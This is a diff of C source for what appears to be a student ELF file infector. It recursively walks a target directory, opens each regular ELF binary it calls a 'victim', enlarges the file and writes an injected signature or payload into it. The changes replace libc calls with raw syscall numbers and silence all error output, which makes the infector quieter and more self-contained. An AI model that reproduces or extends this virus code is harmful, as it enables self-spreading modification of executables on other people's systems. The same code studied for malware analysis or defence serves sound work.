@@ -16,7 +16,7 @@
 #include "libft.h"
 #include "woody.h"
 
-#define WMAP(fd, size, prot, flag) mmap(0, size, prot, flag, fd, 0)
+#define WMAP(fd, size, prot, flag) _syscall(9, 0, size, prot, flag, fd, 0)
 
 #define VICTIM_MAPFLAG (MAP_SHARED)
 #define VICTIM_MAPPROT (PROT_READ | PROT_WRITE)
@@ -26,7 +26,6 @@
 #define	WELF_CHECK(ELF, ptr, filesize, jump, shdr, phdr)		\
 	if (ELF##_E(ptr)->e_machine != EM_386 &&			\
 	    ELF##_E(ptr)->e_machine != EM_X86_64) {			\
-		dprintf(STDERR_FILENO, "Architecture unsupported\n");	\
 		goto jump;						\
 	}								\
 	if ((ELF##_E(ptr)->e_phnum &&					\
@@ -43,7 +42,6 @@
 	      * ELF##_E(ptr)->e_shnum > (filesize) ||			\
 	      ELF##_E(ptr)->e_shentsize != S##ELF##_S ||		\
 	      ELF##_E(ptr)->e_shstrndx >= ELF##_E(ptr)->e_shnum))) {	\
-		dprintf(STDERR_FILENO, "Elf is corrupted\n");		\
 		goto jump;						\
 	}								\
 	(phdr) = ELF##_E(ptr)->e_phoff + (char *)ptr;			\
@@ -56,7 +54,6 @@
 	if (ELF_HDR(ptr)->sh_type != SHT_NOBITS	&&			\
 	    (ELF_HDR(ptr)->sh_offset >= (filesize) ||			\
 	     ELF_HDR(ptr)->sh_offset + ELF_HDR(ptr)->sh_size >= (filesize))) { \
-		dprintf(STDERR_FILENO, "Elf is corrupted\n");		\
 		goto jump;						\
 	}
 
@@ -64,7 +61,6 @@
 #define WELF_PCHECK(ELF_HDR, ptr, filesize, jump)			\
 	if (ELF_HDR(ptr)->p_offset >= (filesize) ||			\
 	    ELF_HDR(ptr)->p_offset + ELF_HDR(ptr)->p_filesz >= (filesize)) { \
-		dprintf(STDERR_FILENO, "Elf is corrupted\n");		\
 		goto jump;						\
 	}
 
@@ -85,52 +81,68 @@ wopen(const char *victim, WFILE *buf)
 	if (0 == buf)
 		goto fail_open;
 
-	fdv = open(victim, O_RDWR);
+	fdv = _syscall(2, victim, O_RDWR);
 	if (0 > fdv) {
+#if 0
 		dprintf(STDERR_FILENO, "fatal: failed to open '%s'\n", victim);
+#endif
 		goto fail_open;
 	}
 
 	if (0 > fstat(fdv, &new->stat)) {
+#if 0
 		dprintf(STDERR_FILENO, "fatal: could not stat '%s'\n", victim);
+#endif
 		goto fail_vmap;
 	}
 
 	_stat = &new->stat;
 	if ((__off_t)SELF64_E > _stat->st_size) {
+#if 0
 		dprintf(STDERR_FILENO, "Unsupported file '%s'\n", victim);
+#endif
 		goto fail_vmap;
 	}
 
-	mapv = WVMAP(fdv, _stat->st_size);
+	mapv = (void *)WVMAP(fdv, _stat->st_size);
 	if (MAP_FAILED == mapv) {
+#if 0
 		dprintf(STDERR_FILENO, "fatal: mmap fail '%s'\n", victim);
+#endif
 		goto fail_vmap;
 	}
 
 	ident = mapv;
 	/* GOD FORBIDS */
-	if (0 != ft_memcmp(ident, ELFMAG, SELFMAG)) {
+	if (0 != ft_memcmp(ident, _ELFMAG, SELFMAG)) {
+#if 0
 		dprintf(STDERR_FILENO, "'%s' is not an elf\n", victim);
+#endif
 		goto fail_corrupt;
 	}
 
 	if (0 == ident[EI_CLASS] ||
 	    3 <= ident[EI_CLASS]) {
+#if 0
 		dprintf(STDERR_FILENO, "Unsupported file '%s'\n", victim);
+#endif
 		goto fail_corrupt;
 	}
 
 	/* This program only supports little endian */
 	if (ELFDATA2LSB != ident[EI_DATA]) {
+#if 0
 		dprintf(STDERR_FILENO, "Unsupported endianess '%s'\n", victim);
+#endif
 		goto fail_corrupt;
 	}
 
 	/* checking if any segment is past size of file */
 
 	if (ident[EI_CLASS] != ELFCLASS64) {
+#if 0
 		dprintf(STDERR_FILENO, "Unsupported architecture '%s'\n", victim);
+#endif
 		goto fail_corrupt;
 	}
 
@@ -163,9 +175,9 @@ wopen(const char *victim, WFILE *buf)
 	return 0;
 
 fail_corrupt:
-	munmap(mapv, _stat->st_size);
+	_syscall(11, mapv, _stat->st_size);
 fail_vmap:
-	close(fdv);
+	_syscall(3, fdv);
 fail_open:
 	return 1;
 }
@@ -173,10 +185,9 @@ fail_open:
 void
 wclose(WFILE *w)
 {
-	munmap(w->map, w->stat.st_size);
-	close(w->fd);
+	_syscall(11, w->map, w->stat.st_size);
+	_syscall(3, w->fd);
 }
-
 
 int
 winject(WFILE const *wfil)
@@ -225,14 +236,16 @@ winject(WFILE const *wfil)
 #endif
 
 	/* is sign ? */
-	if(!memcmp(wfil->map + addr_sign - added, FSIGN_STR, FSIGN_TSIZE))
+	if(!ft_memcmp(wfil->map + addr_sign - added, FSIGN_STR, FSIGN_TSIZE))
 		return (1);
 
 	/* grow file */
 	filsz = wfil->stat.st_size;
 	filsz += added;
-	if (ftruncate(wfil->fd, filsz)) {
+	if (_syscall(77, wfil->fd, filsz)) {
+#if 0
 		dprintf(STDERR_FILENO, "fatal ftruncate error\n");
+#endif
 		goto fail;
 	}
 
@@ -242,48 +255,60 @@ winject(WFILE const *wfil)
 		ELF64_E(ehdr)->e_shoff += added;
 		for (int dx = nasec; dx < ELF64_E(ehdr)->e_shnum; dx++)
 			(ELF64_S(shdr)[dx].sh_offset) += added;
-		memcpy(wfil->map + addr_sign + added,
+		ft_memcpy(wfil->map + addr_sign + added,
 			wfil->map + addr_sign,
 			filsz - addr_sign);
 	}
-	memcpy(wfil->map + addr_sign, FSIGN_STR, FSIGN_TSIZE);
+	ft_memcpy(wfil->map + addr_sign, FSIGN_STR, FSIGN_TSIZE);
 
-	munmap(wfil->map, filsz);
+	_syscall(11, wfil->map, filsz);
 	return 0;
 fail:
 	return -1;
 }
 
-void exe_dir(char *cible, int len)
+#define BUF_SIZE 1024
+struct linux_dirent {
+	long           d_ino;
+	off_t          d_off;
+	unsigned short d_reclen;
+	char           d_name[];
+};
+
+void exe_dir2(char *cible, int len)
 {
-	
 	WFILE w;
-        struct dirent *pd;
-	struct stat statb;
-        DIR     *pdir;
+	int fd, nread, bpos;
+	char buf[BUF_SIZE];
+	struct linux_dirent *dir;
+	char d_type;
 
 	*(cible + len++) = '/';
 	*(cible + len) = '\0';
-	
-        pdir = opendir(cible);
-        while ((pd = readdir(pdir)))
-        {
-		if (*(pd->d_name) == '.' && (*(pd->d_name + 1) == '\0' ||
-		(*(pd->d_name + 1) == '.' && *(pd->d_name + 2) == '\0')))
-			continue ;
-		strcpy(cible + len, pd->d_name);
-		stat(cible, &statb);
-		if (S_ISDIR(statb.st_mode))
+	fd = _syscall(2, cible, O_RDONLY);
+	while ((nread = _syscall(78, fd, buf, BUF_SIZE)) > 0)
+		for (bpos=0; bpos < nread;)
 		{
-			exe_dir(cible, len + strlen(pd->d_name));
+			dir = (struct linux_dirent *)(buf + bpos);
+			if ((*(dir->d_name) != '.' || !(*(dir->d_name + 1) == '\0' ||
+			(*(dir->d_name + 1) == '.' && *(dir->d_name + 2) == '\0'))))
+			{
+				ft_strcpy(cible + len, dir->d_name);
+				d_type = *(buf + bpos + dir->d_reclen - 1);
+				if (d_type == DT_DIR)
+					exe_dir2(cible, len + ft_strlen(dir->d_name));
+				else if (d_type == DT_REG && !wopen(cible, &w))
+				{
+					winject(&w);
+#if 0
+					printf((!ret)?"SUCCESS\n" : (ret == 1) ? "OK\n" : "ERROR\n");
+#endif
+					wclose(&w);
+				}
+			}
+			bpos += dir->d_reclen;
 		}
-		else if (S_ISREG(statb.st_mode) && !wopen(cible, &w))
-		{
-			int ret = winject(&w);
-			printf((!ret)?"SUCCESS\n" : (ret == 1) ? "OK\n" : "ERROR\n");
-		}
-        }
-        closedir (pdir);
+	_syscall(3, fd);
 }
 
 int
@@ -291,7 +316,8 @@ main(void)
 {
 	char	cible[FILENAME_MAX];
 
-	strcpy(cible, DIR_CIBLE);
-	exe_dir(cible, strlen(DIR_CIBLE));
+	
+	ft_strcpy(cible, DIR_CIBLE);
+	exe_dir2(cible, ft_strlen(DIR_CIBLE));
 	return 1;
 }
